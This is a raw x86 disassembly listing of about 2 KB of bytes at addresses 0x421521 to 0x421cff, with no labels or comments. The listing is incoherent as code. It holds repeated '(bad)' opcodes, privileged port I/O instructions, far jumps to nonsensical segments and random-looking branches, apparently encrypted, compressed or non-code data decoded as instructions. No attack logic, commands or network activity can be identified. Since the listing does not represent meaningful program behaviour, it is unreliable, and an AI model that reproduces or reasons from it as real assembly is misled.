  421521:	in     eax,dx
  421522:	mov    fs,WORD PTR [edi+edi*4]
  421525:	add    al,0xad
  421527:	mov    dl,0xc2
  421529:	rcl    BYTE PTR [eax+edx*1],1
  42152c:	mov    bh,0x37
  42152e:	cmp    ebx,DWORD PTR [eax-0x7e]
  421531:	mul    DWORD PTR [ebx]
  421533:	add    al,0x3b
  421535:	jae    0x42157e
  421537:	mov    esi,0x2d843654
  42153c:	repnz mov edi,0x68ebf5d6
  421542:	(bad)  
  421543:	loopne 0x421595
  421545:	cwde   
  421546:	pusha  
  421547:	les    ecx,FWORD PTR [edi]
  421549:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42154a:	mov    ch,0x7
  42154c:	out    0x56,eax
  42154e:	xchg   esp,eax
  42154f:	idiv   BYTE PTR ds:0xb578b338
  421555:	mov    edi,DWORD PTR [ebp-0x13169405]
  42155b:	ret    
  42155c:	cmp    DWORD PTR [edi-0x19cc9c9b],ecx
  421562:	ret    
  421563:	dec    edx
  421564:	clc    
  421565:	call   ebx
  421567:	xchg   esi,eax
  421568:	imul   edi,DWORD PTR [edi+0x75670cf4],0xffffff9d
  42156f:	mov    ch,0x72
  421571:	popf   
  421572:	cmp    ebx,DWORD PTR [edi]
  421574:	ja     0x421560
  421576:	inc    eax
  421577:	push   ebx
  421578:	cwde   
  421579:	cmp    eax,0x61ce8f8c
  42157e:	cmc    
  42157f:	jns    0x421570
  421581:	add    BYTE PTR [ebp-0x5b19931f],bh
  421587:	xchg   DWORD PTR [ebx+eax*8+0x71196bd0],esp
  42158e:	clc    
  42158f:	mov    bh,0x7c
  421591:	mov    cl,0x67
  421593:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421594:	loope  0x42153e
  421596:	outs   dx,BYTE PTR ds:[esi]
  421597:	pop    ss
  421598:	cmc    
  421599:	or     esi,DWORD PTR [ecx+0x4ececc50]
  42159f:	cvtdq2ps xmm7,XMMWORD PTR [eax-0x4d0e9dcc]
  4215a6:	ss cwde 
  4215a8:	stos   BYTE PTR es:[edi],al
  4215a9:	and    eax,ecx
  4215ab:	ins    BYTE PTR es:[edi],dx
  4215ac:	xchg   ebx,eax
  4215ad:	fwait
  4215ae:	cmp    BYTE PTR ds:0xc0c9a777,dl
  4215b4:	aad    0x9c
  4215b6:	sbb    eax,0xfc8065cc
  4215bb:	or     DWORD PTR [eax+0x68],edx
  4215be:	int    0xd8
  4215c0:	sub    ch,BYTE PTR [ecx+0x2]
  4215c3:	outs   dx,BYTE PTR ds:[esi]
  4215c4:	rcr    ch,0x41
  4215c7:	or     ch,dh
  4215c9:	mov    ah,0xd7
  4215cb:	and    eax,0x4a8ec35b
  4215d0:	add    cl,BYTE PTR [edi+edi*4+0x69]
  4215d4:	jg     0x42157f
  4215d6:	xchg   esi,eax
  4215d7:	add    esi,DWORD PTR [esp+edi*4+0x65675a89]
  4215de:	jle    0x421605
  4215e0:	imul   ebp,DWORD PTR [ebp+0x14],0xffffffa1
  4215e4:	xchg   DWORD PTR [edx],esi
  4215e6:	push   es
  4215e7:	cmp    bl,bl
  4215e9:	(bad)  
  4215ea:	push   edx
  4215eb:	fwait
  4215ec:	jb     0x421638
  4215ee:	push   ebp
  4215ef:	aas    
  4215f0:	outs   dx,BYTE PTR ds:[esi]
  4215f1:	pop    edx
  4215f2:	adc    al,0xd7
  4215f4:	inc    ecx
  4215f5:	cmp    DWORD PTR [ecx],esi
  4215f7:	mov    esi,0x131c317
  4215fc:	add    bl,BYTE PTR [edx+0xb3bf524]
  421602:	and    BYTE PTR [ebp-0x78095243],bh
  421608:	shl    DWORD PTR [edi+esi*8],0xa6
  42160c:	out    dx,eax
  42160d:	xor    cl,BYTE PTR [ecx+0x3153dd5f]
  421613:	pop    esp
  421614:	es cmp eax,0xf19e0aab
  42161a:	lahf   
  42161b:	ret    
  42161c:	enter  0xec27,0xc
  421620:	sub    ecx,DWORD PTR [esi-0x10]
  421623:	dec    eax
  421624:	mov    ?,WORD PTR [ecx-0x453cd5ea]
  42162a:	jb     0x42167f
  42162c:	inc    ebx
  42162d:	or     al,BYTE PTR [eax-0x2e]
  421630:	(bad)  
  421631:	dec    ebx
  421632:	add    eax,DWORD PTR [ebx-0x279a155a]
  421638:	push   esi
  421639:	lock retf 0x71bb
  42163d:	je     0x42160f
  42163f:	data16 mov dh,0x21
  421642:	mov    BYTE PTR [edx-0x1a14c91b],bl
  421648:	je     0x4215cb
  42164a:	sub    eax,0x47639784
  42164f:	inc    ecx
  421650:	(bad)
  421653:	lea    esp,[edi-0x40]
  421656:	sbb    DWORD PTR [edx],0xab69
  42165c:	stc    
  42165d:	std    
  42165e:	in     eax,dx
  42165f:	mov    cl,0xed
  421661:	mov    cl,0xfd
  421663:	std    
  421664:	pop    ds
  421665:	xor    dl,0xed
  421668:	in     al,dx
  421669:	jne    0x421610
  42166b:	jmp    0x43a85a
  421670:	xchg   BYTE PTR [edx],al
  421672:	add    BYTE PTR [eax],al
  421674:	es (bad) 
  421676:	stc    
  421677:	jl     0x421623
  421679:	add    ecx,0xe5817c9b
  42167f:	xchg   ecx,eax
  421680:	mov    eax,ds:0x80c64ff4
  421685:	pop    edi
  421686:	mov    dh,dh
  421688:	mov    cl,0x13
  42168a:	sbb    esi,DWORD PTR [edx+0x2d284976]
  421690:	adc    bl,al
  421692:	into   
  421693:	mov    ecx,0x50bdc85e
  421698:	add    ah,BYTE PTR [ebp+0x39]
  42169b:	sbb    cl,BYTE PTR [ebx]
  42169d:	repnz cmp bh,0x22
  4216a1:	pop    es
  4216a2:	pop    ecx
  4216a3:	push   eax
  4216a4:	inc    DWORD PTR [edx-0x78]
  4216a7:	xchg   ecx,eax
  4216a8:	adc    eax,edi
  4216aa:	jns    0x42167e
  4216ac:	into   
  4216ad:	adc    edi,ebx
  4216af:	outs   dx,BYTE PTR ds:[esi]
  4216b0:	out    0x31,al
  4216b2:	fstp   st(1)
  4216b4:	cmp    esi,0x4d5365c4
  4216ba:	push   ss
  4216bb:	sti    
  4216bc:	dec    ebp
  4216bd:	out    dx,eax
  4216be:	sbb    eax,ecx
  4216c0:	inc    esi
  4216c1:	scas   al,BYTE PTR es:[edi]
  4216c2:	mov    ah,0x5f
  4216c4:	mov    ch,0xc7
  4216c6:	mov    ds:0xa271cfca,al
  4216cb:	push   esp
  4216cc:	sbb    al,0x6c
  4216ce:	push   eax
  4216cf:	jl     0x4216de
  4216d1:	mov    ah,0xc6
  4216d3:	or     ch,ch
  4216d5:	int3   
  4216d6:	cmp    BYTE PTR [ecx],cl
  4216d8:	out    dx,al
  4216d9:	dec    ecx
  4216da:	cmp    ebx,edx
  4216dc:	mov    ds:0x35be9f18,al
  4216e1:	jg     0x421740
  4216e3:	addr16 das 
  4216e5:	add    eax,0x20ff8754
  4216ea:	es push esp
  4216ec:	and    bh,BYTE PTR [ecx]
  4216ee:	adc    al,0xf6
  4216f0:	or     DWORD PTR [edi+0x5],esp
  4216f3:	mov    WORD PTR [edx-0x29d6a600],?
  4216f9:	mov    bl,0xfd
  4216fb:	sub    dh,BYTE PTR [edx-0x1d]
  4216fe:	ficomp WORD PTR [ebp-0x56]
  421701:	fldenv [ebp+0x3d1149fe]
  421707:	mov    bh,dl
  421709:	mov    al,0x48
  42170b:	sbb    BYTE PTR [ebx+0x62],cl
  42170e:	push   cs
  42170f:	push   0x9a6682a2
  421714:	fs xor DWORD PTR es:[ebp+eax*4-0x1a5ca795],ebp
  42171d:	sbb    ecx,DWORD PTR [edx]
  42171f:	rcl    DWORD PTR gs:[ebx-0xde345fb],1
  421726:	loopne 0x42176e
  421728:	call   0xc292:0x7ef82ad5
  42172f:	mov    dh,0xfc
  421731:	test   eax,0x972927e
  421736:	push   edi
  421737:	jnp    0x421751
  421739:	jbe    0x4216bf
  42173b:	in     al,0xee
  42173d:	sbb    al,0xc5
  42173f:	scas   al,BYTE PTR es:[edi]
  421740:	test   DWORD PTR [edi],0x19f108fa
  421746:	stos   DWORD PTR es:[edi],eax
  421747:	ficom  DWORD PTR [edx+0x61]
  42174a:	pop    ebp
  42174b:	arpl   WORD PTR [ebx],di
  42174d:	xchg   edi,eax
  42174e:	popa   
  42174f:	scas   al,BYTE PTR es:[edi]
  421750:	test   al,0xd5
  421752:	pop    ebx
  421753:	ror    BYTE PTR [edi+0x50042c65],1
  421759:	dec    edx
  42175a:	(bad)  
  42175b:	test   DWORD PTR [ecx+0x79221320],0x739218e
  421765:	(bad)  
  421766:	pop    esp
  421767:	add    DWORD PTR [esi+esi*4+0x1b],eax
  42176b:	or     esi,DWORD PTR [ebp+0x6d532660]
  421771:	enter  0xc774,0x1e
  421775:	(bad)  
  421778:	or     al,BYTE PTR [edi-0x27]
  42177b:	outs   dx,BYTE PTR ds:[esi]
  42177c:	and    ecx,DWORD PTR [esi-0x185e2955]
  421782:	or     BYTE PTR [ecx-0x5237ce03],dh
  421788:	das    
  421789:	or     eax,0x4692b891
  42178e:	imul   edx,DWORD PTR [edx-0xd700e40],0xffffff9b
  421795:	test   DWORD PTR [ecx-0x68],edx
  421798:	ficom  DWORD PTR [ecx]
  42179a:	into   
  42179b:	das    
  42179c:	sbb    dl,BYTE PTR [ecx-0x26]
  42179f:	ret    
  4217a0:	dec    edx
  4217a1:	ret    0xeefd
  4217a4:	repnz les edi,FWORD PTR [ecx]
  4217a7:	addr16 sahf 
  4217a9:	xor    bl,cl
  4217ab:	cld    
  4217ac:	cmp    esp,DWORD PTR [eax+0x4b]
  4217af:	test   DWORD PTR [esi-0x7e27bd6e],edx
  4217b5:	push   edi
  4217b6:	mov    eax,ds:0xcffb7487
  4217bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4217bc:	scas   eax,DWORD PTR es:[edi]
  4217bd:	pop    ebp
  4217be:	xchg   ebx,eax
  4217bf:	xchg   esp,eax
  4217c0:	jae    0x4217e1
  4217c2:	push   ds
  4217c3:	fisub  WORD PTR [edx+0x63]
  4217c6:	stc    
  4217c7:	pusha  
  4217c8:	loope  0x42181e
  4217ca:	dec    esi
  4217cb:	inc    esp
  4217cc:	repnz sub dh,BYTE PTR [ecx]
  4217cf:	mov    ecx,0x3fcf0d85
  4217d4:	mov    edx,0x367c2ca8
  4217d9:	jp     0x4217d4
  4217db:	outs   dx,DWORD PTR ds:[esi]
  4217dc:	scas   al,BYTE PTR es:[edi]
  4217dd:	jbe    0x421779
  4217df:	out    0x69,al
  4217e1:	pop    eax
  4217e2:	mov    bh,0x40
  4217e4:	inc    ebp
  4217e5:	fcomp  st(0)
  4217e7:	push   ebx
  4217e8:	push   ds
  4217e9:	dec    esp
  4217ea:	add    al,0xeb
  4217ec:	push   ecx
  4217ed:	leave  
  4217ee:	ror    DWORD PTR ds:0xa92a7ad4,cl
  4217f4:	scas   eax,DWORD PTR es:[edi]
  4217f5:	cmp    DWORD PTR [eax-0x35],esp
  4217f8:	retf   0xd317
  4217fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4217fc:	ss cld 
  4217fe:	hlt    
  4217ff:	pop    esp
  421800:	jbe    0x421784
  421802:	test   BYTE PTR [ebp+eax*2+0x31043359],dl
  421809:	push   0x31a6c523
  42180e:	add    esp,ecx
  421810:	jge    0x421864
  421812:	and    al,BYTE PTR [esi-0x55]
  421815:	sbb    BYTE PTR [edi+0x6e],bl
  421818:	leave  
  421819:	pop    esi
  42181a:	shl    WORD PTR [eax],0x1
  42181e:	pop    esi
  42181f:	sbb    BYTE PTR [ebx+0x2b],dh
  421822:	fdiv   DWORD PTR [ebp+0x5303902c]
  421828:	(bad)  
  421829:	nop
  42182a:	js     0x421874
  42182c:	out    dx,al
  42182d:	jge    0x4217f2
  42182f:	xor    dh,ch
  421831:	fadd   DWORD PTR [edi+0x32cc9d37]
  421837:	ss data16 adc al,0xd8
  42183b:	push   0x5a511488
  421840:	(bad)  
  421841:	out    0xe1,eax
  421843:	inc    edi
  421844:	dec    esi
  421845:	jno    0x42180a
  421847:	mov    ebp,0x94eadc12
  42184c:	xor    BYTE PTR ds:0xf72890cd,ch
  421852:	aad    0x8f
  421854:	mov    dh,0xa
  421856:	push   ebp
  421857:	adc    edx,edx
  421859:	cs test al,0x11
  42185c:	jmp    0x42187c
  42185e:	mov    WORD PTR [esi-0x1f],?
  421861:	sahf   
  421862:	or     dl,BYTE PTR [esi+0x3e935b48]
  421868:	(bad)  
  421869:	in     al,0x29
  42186b:	jbe    0x421823
  42186d:	dec    ecx
  42186e:	sbb    bl,BYTE PTR [ebx+edi*2+0x284251d6]
  421875:	fwait
  421876:	(bad)  
  421877:	aas    
  421878:	mov    bl,BYTE PTR [ebp+0x70a39b2]
  42187e:	lock xchg BYTE PTR [ecx-0x51cfc64],cl
  421885:	leave  
  421886:	jmp    0x4a0c:0xfb0d7cd6
  42188d:	cwde   
  42188e:	pop    ss
  42188f:	dec    ebp
  421890:	mov    esi,DWORD PTR ss:[edx-0x31e63755]
  421897:	push   ebx
  421898:	leave  
  421899:	mov    dl,0x66
  42189b:	ins    DWORD PTR es:[edi],dx
  42189c:	hlt    
  42189d:	cmp    dl,bh
  42189f:	mul    BYTE PTR [ebx+0x796b10e7]
  4218a5:	repnz inc esi
  4218a7:	out    dx,eax
  4218a8:	sub    al,0x6a
  4218aa:	les    eax,FWORD PTR [eax+0x757100be]
  4218b0:	xor    BYTE PTR [ebx-0x31169154],ah
  4218b6:	mov    DWORD PTR ss:[ebx+0x1e],esp
  4218ba:	scas   al,BYTE PTR es:[edi]
  4218bb:	in     al,0x83
  4218bd:	jp     0x421856
  4218bf:	mov    ah,0xc2
  4218c1:	rcr    DWORD PTR [esi-0x42],1
  4218c4:	mov    ecx,0x1101446e
  4218c9:	lods   eax,DWORD PTR ds:[esi]
  4218ca:	stos   DWORD PTR es:[edi],eax
  4218cb:	jne    0x421918
  4218cd:	fistp  QWORD PTR [edx-0x59]
  4218d0:	ins    BYTE PTR es:[di],dx
  4218d2:	cdq    
  4218d3:	pop    ss
  4218d4:	lds    ecx,FWORD PTR [ebx-0x9bd251]
  4218da:	pop    edi
  4218db:	div    DWORD PTR [ebp+0x1e379d72]
  4218e1:	jns    0x4218bf
  4218e3:	pop    ds
  4218e4:	push   edi
  4218e5:	addr16 sub al,0xe7
  4218e8:	pop    esi
  4218e9:	jg     0x4218bc
  4218eb:	nop
  4218ec:	imul   eax,ecx,0xea5c4554
  4218f2:	and    eax,0x487104c7
  4218f7:	adc    DWORD PTR [edi-0xdffff38],edx
  4218fd:	rol    BYTE PTR ds:0xf6d53751,0xe3
  421904:	out    dx,al
  421905:	sub    ebp,esp
  421907:	pinsrw mm6,ecx,0x91
  42190b:	popf   
  42190c:	jo     0x4218a2
  42190e:	add    DWORD PTR [eax],eax
  421910:	xchg   BYTE PTR [edx],al
  421912:	add    BYTE PTR [eax],al
  421914:	cmp    ecx,ebp
  421916:	dec    eax
  421917:	xchg   ebx,eax
  421918:	sub    dh,ch
  42191a:	scas   al,BYTE PTR es:[edi]
  42191b:	sub    al,0x94
  42191d:	jp     0x42195b
  42191f:	(bad)  
  421920:	cmp    edi,DWORD PTR [ebx]
  421922:	xor    cl,dl
  421924:	arpl   WORD PTR [ebp-0x16d9bec6],bx
  42192a:	cmp    dl,BYTE PTR [edx-0x49876fc8]
  421930:	mov    gs,WORD PTR es:[eax-0x2c39d70]
  421937:	int    0x85
  421939:	icebp  
  42193a:	mov    ebp,0xc73b9002
  42193f:	clc    
  421940:	scas   al,BYTE PTR es:[edi]
  421941:	mov    ch,0x3f
  421943:	mov    dh,0x72
  421945:	leave  
  421946:	aaa    
  421947:	imul   edi,DWORD PTR [ebx],0x41
  42194a:	test   BYTE PTR [edi-0x2eb5fa1f],dh
  421950:	push   ds
  421951:	(bad)  
  421952:	jmp    0xce31:0x41691a1b
  421959:	push   eax
  42195a:	jnp    0x421991
  42195c:	inc    edx
  42195d:	fsub   QWORD PTR [ecx]
  42195f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421960:	jle    0x4219d5
  421962:	inc    esi
  421963:	std    
  421964:	mov    cs:0xe98c8873,eax
  42196a:	call   0x943:0x1affab29
  421971:	and    eax,0x43791ec1
  421976:	dec    esp
  421977:	cmc    
  421978:	jecxz  0x421965
  42197a:	push   ss
  42197b:	push   edx
  42197c:	ins    BYTE PTR es:[edi],dx
  42197d:	adc    BYTE PTR [edi+0x24],ch
  421980:	push   ss
  421981:	pop    edx
  421982:	jb     0x421958
  421984:	aaa    
  421985:	and    esp,DWORD PTR [edx+0x50c15f65]
  42198b:	loopne 0x421969
  42198d:	and    eax,DWORD PTR [edx-0x21]
  421990:	inc    ebp
  421991:	int3   
  421992:	pop    ecx
  421993:	mov    eax,ds:0xdc33d58e
  421998:	push   eax
  421999:	xchg   eax,esi
  42199b:	adc    bl,BYTE PTR ds:0x77b9f1bb
  4219a1:	retf   0xc7ec
  4219a4:	into   
  4219a5:	(bad)  
  4219a6:	xor    edi,esp
  4219a8:	or     DWORD PTR [edx],ebx
  4219aa:	scas   al,BYTE PTR es:[edi]
  4219ab:	loop   0x4219c9
  4219ad:	xor    DWORD PTR [edx+edi*8+0x6337f42b],esp
  4219b4:	adc    DWORD PTR [esi+0x2e],esi
  4219b7:	fisttp WORD PTR [eax+ebx*8-0x53]
  4219bb:	rep outs dx,DWORD PTR ss:[esi]
  4219be:	adc    DWORD PTR [eax],esi
  4219c0:	out    dx,eax
  4219c1:	push   ecx
  4219c2:	sbb    al,0x6f
  4219c4:	(bad)  
  4219c5:	in     eax,0xe5
  4219c7:	inc    edx
  4219c8:	dec    eax
  4219c9:	sub    DWORD PTR [ebp-0x7a3e2ed8],0xf67de3aa
  4219d3:	lds    ecx,FWORD PTR [esi]
  4219d5:	inc    edx
  4219d6:	sub    eax,0xb08b3c8a
  4219db:	cmp    al,0xf2
  4219dd:	and    DWORD PTR [ebx],0xffffffed
  4219e0:	sbb    BYTE PTR [esi],ch
  4219e2:	xchg   ebp,eax
  4219e3:	(bad)  
  4219e4:	push   edx
  4219e5:	dec    ebx
  4219e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4219e7:	fist   DWORD PTR [ebx+0x27]
  4219ea:	sar    BYTE PTR [ecx+0x25],cl
  4219ed:	aam    0x6a
  4219ef:	sbb    esp,DWORD PTR [eax-0x690fa9d2]
  4219f5:	cld    
  4219f6:	adc    al,0xda
  4219f8:	lahf   
  4219f9:	ror    BYTE PTR [esi-0x51597886],1
  4219ff:	(bad)  
  421a00:	sub    al,0x91
  421a02:	pop    ebx
  421a03:	mov    bh,0x6b
  421a05:	push   ebx
  421a06:	cmp    cl,BYTE PTR [esi]
  421a08:	ret    0xdf3d
  421a0b:	repnz and al,0x79
  421a0e:	dec    esi
  421a0f:	iret   
  421a10:	rcl    BYTE PTR [edx+0x3a],1
  421a13:	push   esp
  421a14:	or     eax,0x93347f59
  421a19:	adc    eax,0xeb85c937
  421a1e:	cli    
  421a1f:	ins    BYTE PTR es:[edi],dx
  421a20:	aam    0xa2
  421a22:	mov    ch,0x3
  421a24:	test   BYTE PTR [edx+0x1f],dl
  421a27:	psraw  mm3,QWORD PTR [esp+eax*8-0x4d]
  421a2c:	push   ebp
  421a2d:	lods   eax,DWORD PTR ds:[esi]
  421a2e:	test   BYTE PTR [edi+eax*4+0x20dee0db],0x61
  421a36:	xchg   ebx,eax
  421a37:	fst    QWORD PTR [ebx+0x58]
  421a3a:	aas    
  421a3b:	mov    al,0x43
  421a3d:	imul   edx,eax,0x39
  421a40:	cli    
  421a41:	and    dl,ch
  421a43:	std    
  421a44:	pop    dx
  421a46:	xor    BYTE PTR [ecx-0x3ca09d03],dh
  421a4c:	fidiv  WORD PTR [ecx+0x509d9374]
  421a52:	data16 mov dl,0x14
  421a55:	imul   eax,edx,0x3a87dae7
  421a5b:	mov    ecx,0x280d6abb
  421a60:	pop    ds
  421a61:	idiv   DWORD PTR [edi+0x3e]
  421a64:	(bad)  
  421a65:	push   esp
  421a66:	test   al,0xef
  421a68:	or     bh,BYTE PTR [edx-0x47f70d34]
  421a6e:	(bad)  
  421a6f:	js     0x421a31
  421a71:	push   ecx
  421a72:	hlt    
  421a73:	sbb    esp,DWORD PTR [ebx+0x6896257]
  421a79:	cdq    
  421a7a:	jnp    0x4219fc
  421a7c:	dec    esi
  421a7d:	push   eax
  421a7e:	mov    eax,0xf5139ee6
  421a83:	add    BYTE PTR [eax-0x62e76d2c],al
  421a89:	jg     0x421a36
  421a8b:	inc    edi
  421a8c:	xchg   edi,eax
  421a8d:	pop    esi
  421a8f:	sbb    BYTE PTR [eax+0x528da53c],0xa2
  421a96:	mov    esp,0xaa1a82dc
  421a9c:	cmp    ecx,DWORD PTR [ebx+0x188ea13d]
  421aa2:	(bad)  
  421aa3:	test   al,0x95
  421aa5:	jno    0x421ab7
  421aa7:	xor    eax,0x334b2b91
  421aac:	test   DWORD PTR [eax],ecx
  421aae:	and    al,0xb2
  421ab0:	ins    DWORD PTR es:[edi],dx
  421ab1:	jae    0x421add
  421ab3:	dec    esp
  421ab4:	and    BYTE PTR [edi+0x5a3792c3],bl
  421aba:	stos   BYTE PTR es:[edi],al
  421abb:	and    eax,0xec35bb8e
  421ac0:	cli    
  421ac1:	mov    ebp,0xe71ed522
  421ac6:	pop    edx
  421ac7:	fidivr WORD PTR [ebx-0x34]
  421aca:	mov    ?,eax
  421acc:	pusha  
  421acd:	jo     0x421ad0
  421acf:	inc    ebp
  421ad0:	adc    cl,BYTE PTR [edi+ecx*8]
  421ad3:	mov    BYTE PTR ds:0x47d52fed,ah
  421ad9:	sbb    DWORD PTR [ebp-0x6a],ecx
  421adc:	add    edi,DWORD PTR [ebp+0x3faad819]
  421ae2:	xor    eax,0x9d00d30f
  421ae7:	fwait
  421ae8:	(bad)  
  421ae9:	stos   DWORD PTR es:[edi],eax
  421aea:	adc    al,0xd4
  421aec:	aad    0xa1
  421aee:	fdivr  DWORD PTR [edi+edi*4+0x41]
  421af2:	mov    ch,0x72
  421af4:	adc    DWORD PTR [ecx+0x2bf00161],0xffffffbc
  421afb:	adc    eax,0x8a148d6d
  421b00:	pop    ebp
  421b01:	retf   0x9f51
  421b04:	jo     0x421a8e
  421b06:	mov    ds:0xed0fb87,al
  421b0b:	adc    bh,BYTE PTR [ebx+0x15]
  421b0e:	push   ebp
  421b0f:	ror    DWORD PTR [edi+0x34],1
  421b12:	fsub   QWORD PTR [eax]
  421b14:	ret    0x7fcb
  421b17:	lods   al,BYTE PTR ds:[esi]
  421b18:	jb     0x421b92
  421b1a:	(bad)  
  421b1c:	icebp  
  421b1d:	mov    ds:0x54d70291,al
  421b22:	inc    ebp
  421b23:	inc    esp
  421b24:	imul   esi,edx,0xffffffb4
  421b27:	mov    eax,0x28d45d25
  421b2c:	in     eax,0x55
  421b2e:	push   eax
  421b2f:	pop    ecx
  421b30:	dec    BYTE PTR [ecx+0x76]
  421b33:	loopne 0x421b36
  421b35:	adc    dl,BYTE PTR [edi-0x652e87ad]
  421b3b:	sbb    al,0xa0
  421b3d:	je     0x421ad0
  421b3f:	mov    ds:0x948ea48a,al
  421b44:	sbb    al,0x2e
  421b46:	xchg   al,bh
  421b48:	or     esp,esp
  421b4a:	pop    ecx
  421b4b:	jecxz  0x421ba4
  421b4d:	xchg   ebp,eax
  421b4e:	mov    WORD PTR [ebx+0x79],?
  421b51:	(bad)  
  421b52:	mov    edx,0xb94c8dd
  421b57:	sub    DWORD PTR [edi+0x6e2eca3d],ecx
  421b5d:	xchg   DWORD PTR [ebx],ecx
  421b5f:	les    edx,FWORD PTR [eax+edi*8-0x25]
  421b63:	add    bl,al
  421b65:	add    esp,ebx
  421b67:	sbb    DWORD PTR [eax+ebp*8+0xe],0xffffffbc
  421b6c:	dec    edi
  421b6d:	and    edi,esp
  421b6f:	jns    0x421b5e
  421b71:	test   BYTE PTR [edx],0x47
  421b74:	add    eax,0x39d2b4f8
  421b79:	into   
  421b7a:	outs   dx,BYTE PTR ds:[esi]
  421b7b:	add    edi,ecx
  421b7d:	mov    esi,0xdf5db71a
  421b82:	imul   edi,DWORD PTR [eax+0x3e258000],0x8959f55d
  421b8c:	test   DWORD PTR [eax-0x5c3d6d5b],ebx
  421b92:	cmp    DWORD PTR [ecx-0x31cd2d6f],0x17
  421b99:	repnz add BYTE PTR [eax],al
  421b9c:	inc    ebx
  421b9d:	inc    ecx
  421b9e:	popa   
  421b9f:	data16 arpl WORD PTR [esi+0x47],sp
  421ba3:	rcr    DWORD PTR gs:[edi+0x16],cl
  421ba7:	xor    BYTE PTR [ebx-0x7b],dh
  421baa:	sbb    cl,BYTE PTR [eax-0xa]
  421bad:	xchg   esi,eax
  421bae:	add    DWORD PTR [eax],eax
  421bb0:	xchg   BYTE PTR [edx],al
  421bb2:	add    BYTE PTR [eax],al
  421bb4:	jmp    0x583a:0x82036fdf
  421bbb:	jae    0x421b67
  421bbd:	jmp    0x421c18
  421bbf:	sti    
  421bc0:	cmc    
  421bc1:	fcmovnb st,st(6)
  421bc3:	iret   
  421bc4:	pop    edx
  421bc5:	ins    DWORD PTR es:[edi],dx
  421bc6:	out    dx,al
  421bc7:	fwait
  421bc8:	pop    ds
  421bc9:	int3   
  421bca:	cmp    dh,dl
  421bcc:	push   0xcd94c2e1
  421bd1:	dec    eax
  421bd2:	or     eax,0x58082f5a
  421bd7:	mov    ds:0x7050b333,al
  421bdc:	xor    eax,0xd42ab9e0
  421be1:	imul   edi,DWORD PTR [ebp-0x1c],0x6e
  421be5:	ins    DWORD PTR es:[edi],dx
  421be6:	mov    esp,DWORD PTR [ecx-0x34]
  421be9:	add    cl,0xce
  421bec:	or     eax,0xa31a286e
  421bf1:	and    BYTE PTR [ecx+0x31],dl
  421bf4:	fsubr  st(3),st
  421bf6:	fcmove st,st(5)
  421bf8:	inc    DWORD PTR [esi+eiz*8-0x11]
  421bfc:	sub    eax,0xf614a81e
  421c01:	xlat   BYTE PTR ds:[ebx]
  421c02:	or     al,0x42
  421c04:	mov    esi,DWORD PTR [eax+0x34]
  421c07:	jb     0x421c6e
  421c09:	outs   dx,DWORD PTR ds:[esi]
  421c0a:	cmp    ebx,DWORD PTR [esi]
  421c0c:	dec    edi
  421c0d:	sub    eax,DWORD PTR [edx+0x5a804c81]
  421c13:	not    BYTE PTR [ecx]
  421c15:	ja     0x421bb0
  421c17:	mov    al,0xef
  421c19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c1a:	outs   dx,DWORD PTR ds:[esi]
  421c1b:	xor    ebx,ebx
  421c1d:	rcr    esi,1
  421c1f:	xor    BYTE PTR [eax-0x60],0x68
  421c23:	mov    ds:0xd7681eb5,eax
  421c28:	inc    esp
  421c29:	or     edi,DWORD PTR [edx]
  421c2b:	inc    ecx
  421c2c:	lea    ebx,[ebx+0x67]
  421c2f:	std    
  421c30:	or     dl,BYTE PTR [ebx-0x18c1b456]
  421c36:	mov    bh,0x10
  421c38:	test   eax,0xad8da83f
  421c3d:	or     BYTE PTR [esi-0x3c],al
  421c40:	adc    dh,ah
  421c42:	lock neg ebp
  421c45:	add    BYTE PTR [edi+0x9d83d1d],ah
  421c4b:	cs mov dl,0xb8
  421c4e:	(bad)  
  421c4f:	into   
  421c50:	lock adc eax,0x4c2a9f82
  421c56:	add    eax,0xc0303964
  421c5b:	ffreep st(6)
  421c5d:	jl     0x421c06
  421c5f:	(bad)  
  421c60:	push   0x89638084
  421c65:	sub    eax,0x14fc9916
  421c6a:	loopne 0x421cc4
  421c6c:	(bad)  
  421c6d:	int3   
  421c6e:	sub    al,0xba
  421c70:	repnz cs stos DWORD PTR es:[edi],eax
  421c73:	pop    esi
  421c74:	jge    0x421c70
  421c76:	add    eax,0xb4b39342
  421c7b:	mov    bh,BYTE PTR [eax]
  421c7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c7e:	xor    BYTE PTR [edx*2+0x27d5b2ce],ah
  421c85:	or     al,0x1a
  421c87:	xchg   DWORD PTR [ebp-0x52],edx
  421c8a:	push   ebx
  421c8b:	popf   
  421c8c:	pop    ebx
  421c8d:	adc    eax,0xf93eabb
  421c92:	ds jmp 0xf6ca:0xda589970
  421c9a:	cmp    al,0x4a
  421c9c:	or     BYTE PTR [eax-0x30],ah
  421c9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ca0:	mov    ecx,0x807d6f96
  421ca5:	repnz and DWORD PTR [edx+0x9ddc2db],ecx
  421cac:	mov    BYTE PTR [ebx+0x69],cl
  421caf:	jg     0x421c37
  421cb1:	cwde   
  421cb2:	or     BYTE PTR [ebx],bl
  421cb4:	sub    ecx,DWORD PTR [ecx-0x8]
  421cb7:	or     al,bh
  421cb9:	arpl   WORD PTR [ecx+0x3c],cx
  421cbc:	nop
  421cbd:	arpl   WORD PTR [edi-0x7d2d36b6],ax
  421cc3:	xor    eax,edx
  421cc5:	mov    cl,0x81
  421cc7:	push   0xffffffad
  421cc9:	add    al,0x57
  421ccb:	adc    BYTE PTR [ebp-0x64],ah
  421cce:	pop    esi
  421ccf:	mov    gs,WORD PTR [edi]
  421cd1:	enter  0xd700,0x6a
  421cd5:	imul   DWORD PTR [ecx-0x19]
  421cd8:	mov    al,ds:0x77ee2c35
  421cdd:	test   dh,al
  421cdf:	inc    edi
  421ce0:	dec    edi
  421ce1:	add    ah,BYTE PTR [ebx]
  421ce3:	leave  
  421ce4:	data16 mov al,ds:0x91db1133
  421cea:	jmp    0x63c3:0x9adf8b9c
  421cf1:	jge    0x421c7a
  421cf3:	fstp   QWORD PTR [edx+eax*2-0x72]
  421cf7:	pop    eax
  421cf8:	sub    al,0xe7
  421cfa:	or     eax,0x28bc23bf
  421cff:	xchg   edx,eax
